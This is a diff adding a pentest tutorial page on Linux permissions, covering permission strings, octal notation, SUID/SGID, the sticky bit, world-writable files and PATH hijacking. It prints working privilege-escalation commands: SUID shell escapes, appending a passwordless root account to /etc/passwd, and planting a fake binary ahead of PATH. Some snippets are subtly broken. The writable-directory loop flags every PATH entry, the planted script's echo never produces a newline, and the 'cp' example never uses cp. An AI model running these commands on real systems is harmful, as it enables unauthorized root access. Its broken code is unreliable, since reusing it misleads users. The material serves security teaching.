@@ -1,0 +1,313 @@
+# Permission Analysis
+
+> Permissions are the gatekeepers of a Linux system. Misconfigured ones are a direct path to root. Learn to read them instantly and spot the misconfigs that defenders miss.
+
+---
+
+## The Mindset
+
+Every file and directory on Linux has a permission set that controls who can read it, write to it, or execute it. As a pentester, you're looking for two things:
+
+- **What can I access that I shouldn't?** — World-readable sensitive files, writable system scripts
+- **What can I run as someone else?** — SUID/SGID binaries, sudo rights, writable cron scripts
+
+Permissions are the most common source of privilege escalation paths on Linux. Administrators set them once and forget them. You find them and use them.
+
+---
+
+## Reading Permission Strings
+
+Run `ls -l` on any file and you'll see this:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+ls -l /etc/passwd
+
+-rwxrw-r-- 1 root root 1641 May 4 23:42 /etc/passwd
+```
+
+Break it down character by character:
+
+```
+- rwx rw- r--   1   root  root   1641   /etc/passwd
+│  │   │   │    │    │     │
+│  │   │   │    │    │     └── Group owner
+│  │   │   │    │    └──────── User owner
+│  │   │   │    └───────────── Number of hard links
+│  │   │   └────────────────── Others' permissions (r--)
+│  │   └────────────────────── Group's permissions (rw-)
+│  └────────────────────────── Owner's permissions (rwx)
+└───────────────────────────── File type
+```
+
+### File Type (First Character)
+
+| Symbol | Meaning          |
+| ------ | ---------------- |
+| `-`    | Regular file     |
+| `d`    | Directory        |
+| `l`    | Symbolic link    |
+| `c`    | Character device |
+| `b`    | Block device     |
+| `s`    | Socket           |
+| `p`    | Named pipe       |
+
+### Permission Characters
+
+| Symbol | On a File              | On a Directory                      |
+| ------ | ---------------------- | ----------------------------------- |
+| `r`    | Read the file contents | List directory contents             |
+| `w`    | Modify the file        | Create, delete, rename files inside |
+| `x`    | Execute the file       | Traverse (enter) the directory      |
+| `-`    | Permission not granted | Permission not granted              |
+
+<Tip>
+  Execute permission on a **directory** doesn't let you run anything — it lets
+  you `cd` into it. Without `x` on a directory, you can't access anything inside
+  even if you have `r`.
+</Tip>
+
+---
+
+## Octal Notation
+
+Permissions are also expressed as numbers. Each permission has a value:
+
+| Permission    | Binary | Octal Value |
+| ------------- | ------ | ----------- |
+| `r` (read)    | 100    | 4           |
+| `w` (write)   | 010    | 2           |
+| `x` (execute) | 001    | 1           |
+| `-` (none)    | 000    | 0           |
+
+Add the values for each group (owner / group / others):
+
+```
+rwx  =  4+2+1  =  7
+rw-  =  4+2+0  =  6
+r-x  =  4+0+1  =  5
+r--  =  4+0+0  =  4
+---  =  0+0+0  =  0
+```
+
+So `chmod 754` means:
+
+```
+7 = rwx  (owner can read, write, execute)
+5 = r-x  (group can read and execute)
+4 = r--  (others can only read)
+```
+
+**Common permission patterns:**
+
+| Octal  | String      | Typical Use                        |
+| ------ | ----------- | ---------------------------------- |
+| `755`  | `rwxr-xr-x` | Executables, public directories    |
+| `644`  | `rw-r--r--` | Regular files, configs             |
+| `600`  | `rw-------` | SSH private keys, sensitive files  |
+| `777`  | `rwxrwxrwx` | World-writable — always suspicious |
+| `4755` | `rwsr-xr-x` | SUID binary                        |
+
+---
+
+## Changing Permissions
+
+### `chmod` — Change File Mode
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Symbolic method
+chmod u+x script.sh       # Add execute for owner
+chmod g-w file.txt        # Remove write from group
+chmod o+r file.txt        # Add read for others
+chmod a+r file.txt        # Add read for all (u+g+o)
+
+# Octal method
+chmod 755 script.sh       # rwxr-xr-x
+chmod 600 id_rsa          # rw------- (SSH key permissions)
+chmod 644 config.txt      # rw-r--r--
+```
+
+### `chown` — Change Ownership
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Change owner
+chown root file.txt
+
+# Change owner and group
+chown root:root file.txt
+
+# Recursive (entire directory)
+chown -R www-data:www-data /var/www/html
+```
+
+---
+
+## SUID & SGID — Privilege Escalation Gold
+
+### What They Are
+
+- **SUID (Set User ID)** — When set on an executable, it runs with the **file owner's** privileges, not the caller's. If root owns a SUID binary, anyone who runs it gets root-level execution.
+- **SGID (Set Group ID)** — Same concept but for groups.
+
+They appear as `s` in place of the execute bit:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+ls -l /usr/bin/passwd
+
+-rwsr-xr-x 1 root root 68208 Nov 29 2022 /usr/bin/passwd
+#  ^
+#  s = SUID bit set, owned by root
+#  anyone running this executes it as root
+```
+
+### Finding SUID/SGID Binaries
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Find all SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Find all SGID binaries
+find / -perm -2000 -type f 2>/dev/null
+
+# Find both at once
+find / -perm /6000 -type f 2>/dev/null
+```
+
+### What To Do With Them
+
+Take every result and check it against **GTFOBins** (https://gtfobins.github.io/) — a curated list of Unix binaries that can be abused for privilege escalation.
+
+Common SUID abuses:
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# find with SUID
+find . -exec /bin/sh -p \; -quit
+
+# vim with SUID
+vim -c ':!/bin/sh'
+
+# bash with SUID
+bash -p
+
+# cp with SUID — overwrite /etc/passwd
+cp /etc/passwd /tmp/passwd.bak
+echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+<Tip>
+  When you find a SUID binary you don't recognize, Google it before running it.
+  Custom SUID binaries are often vulnerable to path injection, buffer overflows,
+  or argument abuse.
+</Tip>
+
+---
+
+## Sticky Bit
+
+The sticky bit on a **directory** means only the file's owner (or root) can delete or rename files inside it — even if others have write access to the directory.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+ls -l /tmp
+
+drwxrwxrwt 10 root root 4096 May 20 12:00 /tmp
+#        ^
+#        t = sticky bit set WITH execute permission
+#        T = sticky bit set WITHOUT execute permission
+```
+
+| Symbol          | Meaning                                     |
+| --------------- | ------------------------------------------- |
+| `t` (lowercase) | Sticky bit set, execute permission also set |
+| `T` (uppercase) | Sticky bit set, execute permission NOT set  |
+
+**Pentest relevance:** `/tmp` always has the sticky bit. You can write files there but can't delete files owned by others. Use it to drop payloads and scripts.
+
+---
+
+## World-Writable Files & Directories
+
+World-writable means **any user** can write to it. In a privesc context, this means you can modify a file that a privileged process may later read or execute.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Find world-writable files (excluding /proc and /sys)
+find / -perm -o+w -type f 2>/dev/null | grep -v "^/proc\|^/sys"
+
+# Find world-writable directories
+find / -perm -o+w -type d 2>/dev/null | grep -v "^/proc\|^/sys"
+```
+
+**What to look for:**
+
+- World-writable scripts that are called by root-owned cron jobs
+- World-writable config files for services running as root
+- World-writable directories in PATH (path hijacking)
+
+---
+
+## PATH Hijacking via Writable Directories
+
+If a directory in the system's PATH is world-writable, you can plant a malicious binary that gets executed instead of the real one.
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Check the PATH
+echo $PATH
+
+# Find writable directories in PATH
+for dir in $(echo $PATH | tr ':' ' '); do
+  ls -ld $dir 2>/dev/null | grep -v "^d..x..x..x" | echo "$dir is writable";
+done
+
+# Plant a fake binary (e.g., if a SUID script calls "service" without full path)
+echo '#!/bin/bash\n/bin/bash -p' > /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+```
+
+---
+
+## Permission Enumeration Checklist
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# 1. Find all SUID binaries → check GTFOBins
+find / -perm -4000 -type f 2>/dev/null
+
+# 2. Find all SGID binaries
+find / -perm -2000 -type f 2>/dev/null
+
+# 3. Find world-writable files
+find / -perm -o+w -type f 2>/dev/null | grep -v "^/proc\|^/sys"
+
+# 4. Find world-writable directories
+find / -perm -o+w -type d 2>/dev/null | grep -v "^/proc\|^/sys"
+
+# 5. Check sudo rights
+sudo -l
+
+# 6. Check your group memberships
+id
+
+# 7. Find files owned by your user elsewhere on the system
+find / -user $(whoami) -type f 2>/dev/null | grep -v "^/proc\|^/home/$(whoami)"
+
+# 8. Find files writable by your group
+find / -group $(id -gn) -writable -type f 2>/dev/null
+```
+
+---
+
+## Quick Reference
+
+| Command                          | Purpose                   |
+| -------------------------------- | ------------------------- |
+| `ls -l`                          | View permissions on files |
+| `ls -la`                         | Include hidden files      |
+| `chmod 755 file`                 | Set permissions via octal |
+| `chmod u+x file`                 | Add execute for owner     |
+| `chown user:group file`          | Change ownership          |
+| `find / -perm -4000 2>/dev/null` | Find SUID binaries        |
+| `find / -perm -2000 2>/dev/null` | Find SGID binaries        |
+| `find / -perm -o+w 2>/dev/null`  | Find world-writable files |
+| `stat file`                      | Detailed file metadata    |
+
+---
+
+_Next: [User & Group Management](/tech/linux/user-management) — enumerating users, reading `/etc/shadow`, and finding lateral movement targets._
